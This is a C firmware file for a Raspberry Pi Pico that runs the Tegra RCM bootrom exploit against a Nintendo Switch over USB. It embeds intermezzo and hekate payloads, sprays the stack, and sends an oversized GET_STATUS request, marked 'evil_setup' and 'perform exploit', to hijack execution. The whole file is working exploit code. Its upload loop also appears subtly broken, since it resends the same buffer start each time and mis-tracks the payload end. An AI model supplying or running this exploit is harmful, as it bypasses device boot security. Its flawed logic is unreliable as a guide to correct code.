#include <pico/stdlib.h>
#include <pico/platform.h>
#include <tusb.h>
#include <bsp/board.h>

#include "bin/hekate_ctcaer_5.8.0.hex"
#include "bin/intermezzo.hex"

#define LED_PIN 13

#define USB_VID 0x0955
#define USB_PID 0x7321

#define SETUP_PACKET_SIZE 8
#define RCM_PAYLOAD_ADDR 0x40010000
#define PAYLOAD_START_ADDR 0x40010E40
#define STACK_SPRAY_START 0x40014E40
#define STACK_SPRAY_END 0x40017000
#define STACK_END 0x40010000

#define PAYLOAD_LENGTH 0x30298

uint8_t payload_buffer[PAYLOAD_LENGTH] = {0};

const uint32_t COPY_BUFFER_ADDRESSES[2] = {0x40005000, 0x40009000};

volatile int error_line = 0;

static int current_buffer = 0;

static void _panic(int);
static void assert_true(bool, int);
static void assert_success(xfer_result_t, int);
void tuh_mount_cb(uint8_t);
static inline uint32_t get_current_buffer_address();
static inline void toggle_buffer();
void trigger_controlled_memcpy(uint8_t);
void payload_write(uint8_t, uint8_t*, uint8_t*);

int main()
{
    gpio_init(LED_PIN);
    gpio_set_dir(LED_PIN, GPIO_OUT);

    assert_true(tusb_init(), __LINE__);

    while (1)
    {
        tuh_task();
    }
}

static void _panic(int line_nubmer)
{
    error_line = line_nubmer;
    while (1) {
        gpio_put(LED_PIN, 1);
        sleep_ms(300);
        gpio_put(LED_PIN, 0);
        sleep_ms(300);
    }
}
static void assert_true(bool expr, int line)
{
    if (!expr)
        _panic(line);
}
static void assert_success(xfer_result_t res, int line)
{
    assert_true(res == XFER_RESULT_SUCCESS, line);
}

static inline void toggle_buffer()
{
    current_buffer = 1 - current_buffer;
}
static inline uint32_t get_current_buffer_address()
{
    return COPY_BUFFER_ADDRESSES[current_buffer];
}

void trigger_controlled_memcpy(uint8_t daddr)
{
    tusb_control_request_t evil_setup = {
        .bmRequestType_bit = {
            .direction = TUSB_DIR_IN,
            .type = TUSB_REQ_TYPE_STANDARD,
            .recipient = TUSB_REQ_RCPT_ENDPOINT,
        },
        .bRequest = TUSB_REQ_GET_STATUS,
        .wValue = 0,
        .wIndex = 0,
        .wLength = STACK_END - get_current_buffer_address(),
    };

    // perform exploit
    tuh_xfer_t evil = {
        .daddr = daddr,
        .ep_addr = 0,
        .setup = &evil_setup,
        .complete_cb = NULL, // to use "sync" mode
    };
    assert_true(tuh_control_xfer(&evil), __LINE__);
    assert_success(evil.result, __LINE__);
}

void payload_write(uint8_t daddr, uint8_t *startp, uint8_t *endp)
{
    const int packet_size = 0x1000;
    int length = endp - startp;

    while (length) {
        int bytes_to_transmit = length < packet_size ? length : packet_size;
        length -= bytes_to_transmit;

        toggle_buffer();

        tuh_xfer_t xfer = {
            .daddr = daddr,
            .ep_addr = 1,
            .buffer = startp,
            .buflen = bytes_to_transmit,
            .complete_cb = NULL, // please be synchronous, thanks!
        };
        assert_true(tuh_edpt_xfer(&xfer), __LINE__);
    }
}

void switch_to_highbuf(uint8_t daddr) {
    if (get_current_buffer_address() != COPY_BUFFER_ADDRESSES[1]) {
        uint8_t buf[0x1000] = { 0 };
        tuh_xfer_t xfer = {
            .daddr = daddr,
            .ep_addr = 1,
            .buffer = buf,
            .buflen = 0x1000,
            .complete_cb = NULL, // please be synchronous
        };
        assert_true(tuh_edpt_xfer(&xfer), __LINE__);
    }
}

void tuh_mount_cb(uint8_t daddr)
{
    // verify that the device is an RCM switch attached
    tusb_desc_device_t desc;
    assert_success(tuh_descriptor_get_device_sync(daddr, &desc, sizeof(tusb_desc_device_t)), __LINE__);
    if (desc.idVendor != USB_VID || desc.idProduct != USB_PID)
    {
        return;
    }

    // send payload
    // payload max length
    uint8_t *buf_p = payload_buffer;
    *buf_p++ = PAYLOAD_LENGTH & 0xFF;
    *buf_p++ = (PAYLOAD_LENGTH >> 8) & 0xFF;
    *buf_p++ = (PAYLOAD_LENGTH >> 16) & 0xFF;
    *buf_p++ = (PAYLOAD_LENGTH >> 24) & 0xFF;
    buf_p = &payload_buffer[680];
    // load intermezzo into payload
    memcpy(buf_p, intermezzo, sizeof(intermezzo));
    buf_p += sizeof(intermezzo);
    int padding_size = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + sizeof(intermezzo));
    buf_p += padding_size;

    // fit some of the payload before
    padding_size = STACK_SPRAY_END - PAYLOAD_START_ADDR;
    memcpy(buf_p, payload, padding_size);
    buf_p += padding_size;

    // stack spray
    int repeat_count = (STACK_SPRAY_END - STACK_SPRAY_START) / 4;
    for (int i = 0; i < repeat_count; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            *buf_p++ = (RCM_PAYLOAD_ADDR >> (j * 8)) & 0xFF;
        }
    }

    // add the rest of the payload
    memcpy(buf_p, &payload[padding_size], sizeof(payload) - padding_size);

    // pad the payload exactly to fill a usb request
    padding_size = 0x1000 - ((buf_p - payload_buffer) % 0x1000);
    buf_p += padding_size;

    // check if it will fit in the RCM high buffer
    assert_true(!(buf_p - payload_buffer > PAYLOAD_LENGTH), __LINE__);

    // Upload the payload
    payload_write(daddr, payload_buffer, buf_p);

    switch_to_highbuf(daddr);

    trigger_controlled_memcpy(daddr);

    gpio_put(LED_PIN, 1);
    while(1);
}